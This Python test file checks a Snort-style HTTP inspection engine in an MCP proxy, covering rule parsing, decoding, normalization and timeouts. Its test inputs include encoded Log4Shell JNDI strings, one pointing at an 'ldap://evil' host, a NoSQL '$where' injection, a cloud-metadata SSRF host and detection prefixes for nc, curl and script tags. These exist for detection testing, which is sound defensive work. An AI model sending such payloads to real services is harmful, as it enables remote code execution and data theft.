#!/usr/bin/env python3
"""Cross-runtime catalog fixtures and Python inspection boundary regressions."""
import json
import os
from pathlib import Path
import subprocess
import signal
import sys
import threading
import textwrap
import tempfile
import unittest
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "cmd/ax-mcp-proxy"))
import ax_mcp_proxy as proxy


def rule(options, sid=9000001, action="drop"):
    return f'{action} tcp any any -> any any ({options} sid:{sid}; rev:1;)'


class TestSnortRules(unittest.TestCase):
    def engine(self, options, action="drop"):
        engine = proxy.SnortEngine()
        engine.load_rules(rule(options, action=action))
        return engine

    def inspect(self, engine, body="", url="https://example.com/", headers=None, method="POST"):
        return engine.inspect(method, url, headers or {}, body)

    def test_all_catalog_rules_have_positive_and_negative_shared_fixtures(self):
        fixture_path = ROOT / "pkg/security/snort/testdata/rule_cases.json"
        cases = json.loads(fixture_path.read_text())["cases"]
        engines = {}
        rules = {}
        coverage = {}
        for profile in ("default", "strict"):
            engine = proxy.SnortEngine()
            proxy.load_profile(engine, profile)
            engines[profile] = {entry.sid: entry for entry in engine.rules}
            rules.update(engines[profile])
        for case in cases:
            with self.subTest(name=case["name"], sid=case["sid"]):
                profile = case.get("profile", "default")
                self.assertIn(case["sid"], engines[profile])
                engine = proxy.SnortEngine()
                engine.rules = [engines[profile][case["sid"]]]
                _, matched, _ = engine.inspect(case.get("method", "GET"), case.get("url", "https://example.com/"), case.get("headers", {}), case.get("body", ""))
                self.assertEqual(matched is not None, case["match"])
                coverage.setdefault(case["sid"], set()).add(case["match"])
        self.assertEqual(set(rules), set(coverage))
        for sid in rules:
            self.assertEqual(coverage[sid], {True, False}, f"SID {sid} lacks positive/negative fixtures")

    def test_failed_load_is_atomic_and_rejects_duplicate_sid(self):
        engine = self.engine('content:"safe";')
        initial = list(engine.rules)
        invalid = rule('content:"new";', sid=9000002) + "\n" + rule('content:"duplicate";')
        with self.assertRaises(ValueError):
            engine.load_rules(invalid)
        self.assertEqual(engine.rules, initial)
        with self.assertRaises(ValueError):
            engine.load_rules(rule('content:"next";', sid=9000003) + '\nnot a rule')
        self.assertEqual(engine.rules, initial)

    def test_fail_closed_parser(self):
        invalid = [
            'drop tcp any any -> any any (sid:1;)',
            'pass tcp any any -> any any (content:"x"; sid:1;)',
            'drop udp any any -> any any (content:"x"; sid:1;)',
            'drop tcp $HOME_NET any -> any any (content:"x"; sid:1;)',
            'drop tcp any any -> any 443 (content:"x"; sid:1;)',
            'drop tcp any any -> any any (content:"x"; sid:1; sid:2;)',
            'drop tcp any any -> any any (content:"x"; sid:0;)',
            'drop tcp any any -> any any (content:"x"; sid:1; rev:0;)',
            'drop tcp any any -> any any (content:"x"; sid:1)',
            rule('content:"";'),
            rule('content:x;'),
            rule('content:"x"; http_uri; http_header;'),
            rule('nocase; content:"x";'),
            rule('content:"x"; nocase; nocase;'),
            rule('content:"x"; distance:1;'),
            rule('content:"x"; offset:-1;'),
            rule('content:"x"; depth:0;'),
            rule('pcre:"/x/"; nocase;'),
            rule('pcre:"/x/z";'),
            rule('pcre:"/x/ii";'),
            rule('pcre:"/(?=x)/";'),
            rule(r'pcre:"/(x)\1/";'),
            rule('content:"|xy|";'),
            rule('content:"|41";'),
            rule(r'content:"\q";'),
            rule('content:"x"; metadata:service http;'),
            rule('content:"x"; flow:to_server;'),
        ]
        for text in invalid:
            with self.subTest(text=text), self.assertRaises(ValueError):
                proxy.SnortEngine().load_rules(text)

    def test_mixed_matcher_modifiers_follow_immediately_prior_matcher(self):
        engine = self.engine('pcre:"/^POST$/"; http_method; content:"needle"; http_client_body;')
        self.assertTrue(self.inspect(engine, body="needle")[0])
        self.assertFalse(self.inspect(engine, body="safe", url="https://example.com/needle")[0])
        self.assertFalse(self.inspect(engine, body="needle", method="GET")[0])
        engine = self.engine('content:"needle"; http_client_body; pcre:"/^POST$/"; http_method;')
        self.assertTrue(self.inspect(engine, body="needle")[0])

    def test_raw_uri_and_body_preserve_encoded_bytes(self):
        raw_uri = self.engine('content:"%6eeedle"; http_raw_uri;')
        decoded_uri = self.engine('content:"needle"; http_raw_uri;')
        self.assertTrue(self.inspect(raw_uri, url="https://example.com/%6eeedle?q=1")[0])
        self.assertFalse(self.inspect(decoded_uri, url="https://example.com/%6eeedle?q=1")[0])
        self.assertFalse(self.inspect(self.engine('content:"example.com"; http_raw_uri;'))[0])
        self.assertTrue(self.inspect(self.engine('pcre:"/^\\/path\\?$/"; http_raw_uri;'), url="https://example.com/path?")[0])
        self.assertFalse(self.inspect(raw_uri, url="https://example.com/#%6eeedle")[0])
        raw_body = self.engine('content:"needle"; http_raw_body;')
        normalized = self.engine('content:"needle"; http_client_body;')
        for body in ("%6eeedle", r'{"x":"\u006eeedle"}'):
            with self.subTest(body=body):
                self.assertFalse(self.inspect(raw_body, body=body)[0])
                self.assertTrue(self.inspect(normalized, body=body)[0])
        self.assertTrue(self.inspect(self.engine('content:"%6eeedle"; http_raw_body;'), body="%6eeedle")[0])

    def test_header_field_inspects_only_named_value_and_normalizes(self):
        engine = self.engine('pcre:"/^needle$/"; http_header:field X-Target;')
        for value in ("needle", "%6eeedle", "&#110;eedle"):
            with self.subTest(value=value):
                self.assertTrue(self.inspect(engine, headers={"x-TaRgEt": value})[0])
        self.assertFalse(self.inspect(engine, headers={"X-Other": "needle", "X-Target": "safe"})[0])
        self.assertFalse(self.inspect(engine, headers={"X-Other": "needle"})[0])
        self.assertFalse(self.inspect(self.engine('content:"X-Target:"; http_header:field x-target;'), headers={"X-Target": "safe"})[0])

    def test_missing_header_field_cannot_satisfy_negation(self):
        for matcher in ('content:!"needle";', 'pcre:!"/needle/";'):
            with self.subTest(matcher=matcher):
                engine = self.engine(matcher + " http_header:field x-target;")
                self.assertFalse(self.inspect(engine)[0])
                self.assertFalse(self.inspect(engine, headers={"X-Other": "safe"})[0])
                self.assertFalse(self.inspect(engine, headers={"X-Target": "%6eeedle"})[0])
                self.assertTrue(self.inspect(engine, headers={"X-Target": "safe"})[0])
                self.assertTrue(self.inspect(engine, headers={"X-Target": ""})[0])

    def test_header_host_field_uses_actual_url_authority(self):
        engine = self.engine('pcre:"/^metadata\\.google\\.internal:8080$/"; http_header:field host;')
        self.assertTrue(self.inspect(engine, url="http://metadata.google.internal:8080/path", headers={"Host": "safe.example"})[0])
        self.assertFalse(self.inspect(engine, headers={"Host": "metadata.google.internal:8080"})[0])

    def test_extended_target_parser_rejects_invalid_or_repeated_modifiers(self):
        invalid = [
            'content:"x"; http_header:field;',
            'content:"x"; http_header:field x y;',
            'content:"x"; http_header:field x,y;',
            'content:"x"; http_header:field x:y;',
            'content:"x"; http_header:unknown x;',
            'content:"x"; http_header:field x; http_uri;',
            'content:"x"; http_header; http_header:field x;',
            'content:"x"; http_raw_uri:field x;',
            'content:"x"; http_raw_body:raw;',
            'content:"x"; http_raw_body; http_client_body;',
            'http_raw_uri; content:"x";',
        ]
        for options in invalid:
            with self.subTest(options=options), self.assertRaises(ValueError):
                self.engine(options)

    def test_header_field_buffers_are_cached_per_distinct_name(self):
        engine = proxy.SnortEngine()
        engine.load_rules("\n".join(rule('content:"missing"; http_header:field x-target;', sid=9300000 + index) for index in range(20)))
        with patch.object(proxy, "_normalized_views", wraps=proxy._normalized_views) as normalized:
            self.inspect(engine, headers={"X-Target": "safe"})
        self.assertEqual(normalized.call_count, 5)

    def test_strict_action_overrides_promote_without_duplicating_rules(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(proxy, "RULE_DIRECTORY", Path(directory)):
            directory = Path(directory)
            (directory / "default.rules").write_text(rule('content:"advisory";', sid=1, action="alert"))
            (directory / "strict.rules").write_text(rule('content:"strict";', sid=2))
            (directory / "strict-actions.json").write_text('{"1":"block"}')
            default = proxy.SnortEngine()
            self.assertEqual(proxy.load_profile(default), 1)
            self.assertFalse(self.inspect(default, body="advisory")[0])
            strict = proxy.SnortEngine()
            self.assertEqual(proxy.load_profile(strict, "strict"), 2)
            self.assertEqual([entry.sid for entry in strict.rules], [1, 2])
            self.assertTrue(self.inspect(strict, body="advisory")[0])
            self.assertEqual(strict.rules[0].action, "block")
            self.assertEqual(default.rules[0].action, "alert")

    def test_invalid_strict_overrides_and_duplicate_profile_sids_are_atomic(self):
        invalid = [
            '{"1":"drop","1":"block"}',
            '{"3":"drop"}',
            '{"0":"drop"}',
            '{"01":"drop"}',
            '{"-1":"drop"}',
            '{"2147483648":"drop"}',
            '{"1":"alert"}',
            '{"1":"pass"}',
            '{"1":null}',
            '{"1":{"action":"drop"}}',
            '{"2":"drop"}',  # already blocking, so not an alert promotion
            '[]',
            '{',
        ]
        with tempfile.TemporaryDirectory() as directory, patch.object(proxy, "RULE_DIRECTORY", Path(directory)):
            directory = Path(directory)
            (directory / "default.rules").write_text(rule('content:"advisory";', sid=1, action="alert"))
            (directory / "strict.rules").write_text(rule('content:"strict";', sid=2))
            engine = self.engine('content:"existing";')
            before = list(engine.rules)
            for overrides in invalid:
                with self.subTest(overrides=overrides):
                    (directory / "strict-actions.json").write_text(overrides)
                    with self.assertRaises(ValueError):
                        proxy.load_profile(engine, "strict")
                    self.assertEqual(engine.rules, before)
            (directory / "strict-actions.json").write_text('{"1":"drop"}')
            (directory / "strict.rules").write_text(rule('content:"duplicate";', sid=1))
            with self.assertRaises(ValueError):
                proxy.load_profile(engine, "strict")
            self.assertEqual(engine.rules, before)
            (directory / "strict.rules").write_text(rule('content:"duplicate-existing";'))
            with self.assertRaises(ValueError):
                proxy.load_profile(engine, "strict")
            self.assertEqual(engine.rules, before)

    def test_missing_strict_overrides_fail_atomically_but_default_ignores_them(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(proxy, "RULE_DIRECTORY", Path(directory)):
            directory = Path(directory)
            (directory / "default.rules").write_text(rule('content:"advisory";', sid=1, action="alert"))
            (directory / "strict.rules").write_text(rule('content:"strict";', sid=2))
            default = proxy.SnortEngine()
            self.assertEqual(proxy.load_profile(default), 1)
            strict = self.engine('content:"existing";')
            before = list(strict.rules)
            with self.assertRaises(FileNotFoundError):
                proxy.load_profile(strict, "strict")
            self.assertEqual(strict.rules, before)

    def test_alert_cannot_mask_later_block(self):
        engine = proxy.SnortEngine()
        engine.load_rules(rule('content:"needle";', action="alert") + '\n' + rule('content:"needle";', sid=9000002))
        blocked, matched, _ = self.inspect(engine, body="needle")
        self.assertTrue(blocked)
        self.assertEqual(matched.sid, 9000002)

    def test_content_hex_escaped_quotes_semicolons_and_literal_pipes(self):
        engine = self.engine(r'content:"a|3b 22|b\|c\\d"; http_client_body;')
        self.assertTrue(self.inspect(engine, body='a;"b|c\\d')[0])

    def test_offset_and_depth_are_bytes(self):
        engine = self.engine('content:"x"; http_client_body; offset:4; depth:1;')
        self.assertTrue(self.inspect(engine, body="🙂x")[0])
        self.assertFalse(self.inspect(engine, body="🙂yx")[0])

    def test_percent_html_and_json_decoding(self):
        engine = self.engine('content:"${jndi:"; http_client_body;')
        payloads = [
            "%252524%25257Bjndi%25253A",
            "&#36;&#123;jndi:",
            r'{"a":"\u0024\u007bjndi:"}',
            r'{"a":"safe","a":"\u0024\u007bjndi:"}',
            r'{"a":"%24%7Bjndi%3A"}',
        ]
        for body in payloads:
            with self.subTest(body=body):
                self.assertTrue(self.inspect(engine, body=body)[0])
        self.assertFalse(self.inspect(engine, body=r'{"a":"\u0024\u007bjndi:" invalid json')[0])

    def test_json_structural_rules_match_escaped_keys(self):
        engine = proxy.SnortEngine()
        proxy.load_profile(engine)
        engine.rules = [entry for entry in engine.rules if entry.sid == 1100807]
        self.assertEqual(len(engine.rules), 1)
        self.assertTrue(self.inspect(engine, body=r'{"\u0024where":"function(){return true}"}')[0])
        structural = self.engine(r'content:"|22|needle|22|:"; http_client_body;')
        self.assertTrue(self.inspect(structural, body=r'{"\u006eeedle":"safe"}')[0])
        # A JSON string containing an escaped nested document is also inspected.
        self.assertTrue(self.inspect(structural, body=r'"{\u0022needle\u0022:1}"')[0])

    def test_malformed_percent_does_not_disable_valid_decoding(self):
        for target in ("http_uri", "http_client_body"):
            engine = self.engine(f'content:"${{jndi:"; {target};')
            payload = "%2524%257Bjndi%253Aldap://evil/x&bad=%xx"
            kwargs = {"url": "https://example.com/?q=" + payload} if target == "http_uri" else {"body": payload}
            with self.subTest(target=target):
                self.assertTrue(self.inspect(engine, **kwargs)[0])

    def test_json_decoder_recursion_failure_fails_closed(self):
        with patch.object(proxy.json, "loads", side_effect=RecursionError), self.assertRaises(ValueError):
            self.inspect(self.engine('content:"needle";'), body='["safe"]')

    def test_plus_decoding_preserves_literal_plus_view(self):
        for pattern in ("a+b", "a b"):
            with self.subTest(pattern=pattern):
                self.assertTrue(self.inspect(self.engine(f'content:"{pattern}"; http_client_body;'), body="a+b")[0])

    def test_negated_matcher_checks_every_view(self):
        for option in ('content:!"needle";', 'pcre:!"/needle/";'):
            engine = self.engine(option + " http_client_body;")
            self.assertFalse(self.inspect(engine, body="%6eeedle")[0])
            self.assertTrue(self.inspect(engine, body="safe")[0])

    def test_independent_views_do_not_create_synthetic_cross_variant_matches(self):
        engine = self.engine('pcre:"/x%79\\s+xy/"; http_client_body;')
        self.assertFalse(self.inspect(engine, body="x%79")[0])

    def test_normalization_is_cached_once_per_field(self):
        engine = proxy.SnortEngine()
        engine.load_rules("\n".join(rule('content:"never-match";', sid=9100000 + index) for index in range(40)))
        with patch.object(proxy, "_normalized_views", wraps=proxy._normalized_views) as normalize:
            self.inspect(engine, body="safe")
        self.assertEqual(normalize.call_count, 4)

    def test_normalization_view_and_output_limits_fail_closed(self):
        with patch.object(proxy, "MAX_NORMALIZED_VIEWS", 1), self.assertRaises(ValueError):
            self.inspect(self.engine('content:"needle";'), body="%61")
        with self.assertRaises(ValueError):
            proxy._normalized_views("%61" * 100, 10)

    def test_request_size_encoding_and_header_limits(self):
        engine = self.engine('content:"needle";')
        cases = [
            {"body": "x" * (proxy.MAX_BODY_BYTES + 1)},
            {"url": "https://example.com/" + "x" * proxy.MAX_URL_BYTES},
            {"headers": {f"X-{index}": "x" for index in range(proxy.MAX_HEADERS + 1)}},
            {"headers": {"X-Test": "x" * proxy.MAX_HEADER_BYTES}},
            {"headers": {"Content-Encoding": "br"}},
            {"headers": {"X-Test": "a", "x-test": "b"}},
        ]
        for kwargs in cases:
            with self.subTest(fields=list(kwargs)), self.assertRaises(ValueError):
                self.inspect(engine, **kwargs)

    def test_inspection_timer_restores_handler_after_success_and_error(self):
        handler = signal.getsignal(signal.SIGALRM)
        engine = self.engine('content:"needle";')
        self.inspect(engine, body="safe")
        self.assertIs(signal.getsignal(signal.SIGALRM), handler)
        self.assertEqual(signal.getitimer(signal.ITIMER_REAL), (0.0, 0.0))
        with self.assertRaises(ValueError):
            self.inspect(engine, url="invalid")
        self.assertIs(signal.getsignal(signal.SIGALRM), handler)
        self.assertEqual(signal.getitimer(signal.ITIMER_REAL), (0.0, 0.0))

    def test_inspection_timeout_interrupts_regex_and_restores_timer(self):
        # The subprocess deadline also protects this regression if the watchdog
        # itself regresses. The custom expression has exponential backtracking.
        script = textwrap.dedent('''            import signal
            import sys
            from unittest.mock import patch
            sys.path.insert(0, "cmd/ax-mcp-proxy")
            import ax_mcp_proxy as proxy
            engine = proxy.SnortEngine()
            engine.load_rules('drop tcp any any -> any any (pcre:"/(a+)+$/"; http_client_body; sid:1;)')
            previous = signal.getsignal(signal.SIGALRM)
            with patch.object(proxy, "MAX_INSPECTION_SECONDS", 0.02):
                try:
                    engine.inspect("POST", "https://example.com/", {}, "a" * 40 + "!")
                    raise AssertionError("regex escaped the budget")
                except proxy.InspectionBudgetError:
                    pass
            assert signal.getsignal(signal.SIGALRM) is previous
            assert signal.getitimer(signal.ITIMER_REAL) == (0.0, 0.0)
            print("completed")
        ''')
        result = subprocess.run([sys.executable, "-c", script], cwd=ROOT, capture_output=True, text=True,
                                timeout=3, env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.strip(), "completed")

    def test_inspection_does_not_overwrite_caller_timer(self):
        handler = signal.getsignal(signal.SIGALRM)
        signal.setitimer(signal.ITIMER_REAL, 10)
        try:
            with self.assertRaisesRegex(proxy.InspectionBudgetError, "active caller timer"):
                self.inspect(self.engine('content:"needle";'))
            self.assertIs(signal.getsignal(signal.SIGALRM), handler)
            self.assertGreater(signal.getitimer(signal.ITIMER_REAL)[0], 0)
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)

    def test_inspection_in_worker_thread_fails_closed(self):
        errors = []
        engine = self.engine('content:"needle";')
        def worker():
            try:
                self.inspect(engine)
            except proxy.InspectionBudgetError as exc:
                errors.append(str(exc))
        thread = threading.Thread(target=worker)
        thread.start()
        thread.join(timeout=1)
        self.assertFalse(thread.is_alive())
        self.assertEqual(len(errors), 1)
        self.assertIn("POSIX main thread", errors[0])

    def test_timeout_is_not_swallowed_as_invalid_json(self):
        with patch.object(proxy.json, "loads", side_effect=proxy.InspectionBudgetError("time limit")), self.assertRaises(proxy.InspectionBudgetError):
            self.inspect(self.engine('content:"needle";'), body='["safe"]')

    def test_baseline_regex_adversarial_near_misses_finish(self):
        script = textwrap.dedent('''            import sys
            sys.path.insert(0, "cmd/ax-mcp-proxy")
            import ax_mcp_proxy as proxy
            catalog = proxy.SnortEngine()
            proxy.load_profile(catalog)
            rules = {entry.sid: entry for entry in catalog.rules}
            for sid, prefix in ((1000002, "${"), (1000004, "nc "), (1000005, "curl "), (1000006, "|"), (1000050, "<script")):
                engine = proxy.SnortEngine()
                engine.rules = [rules[sid]]
                payload = (prefix * (65536 // len(prefix) + 1))[:65536]
                assert not engine.inspect("POST", "https://example.com/", {}, payload)[0], sid
            print("completed")
        ''')
        result = subprocess.run([sys.executable, "-c", script], cwd=ROOT, capture_output=True, text=True,
                                timeout=10, env={**os.environ, "PYTHONDONTWRITEBYTECODE": "1"})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.strip(), "completed")

    def test_missing_catalog_is_fatal(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(proxy, "RULE_DIRECTORY", Path(directory)), self.assertRaises(FileNotFoundError):
            proxy.load_profile(proxy.SnortEngine())


if __name__ == "__main__":
    unittest.main()
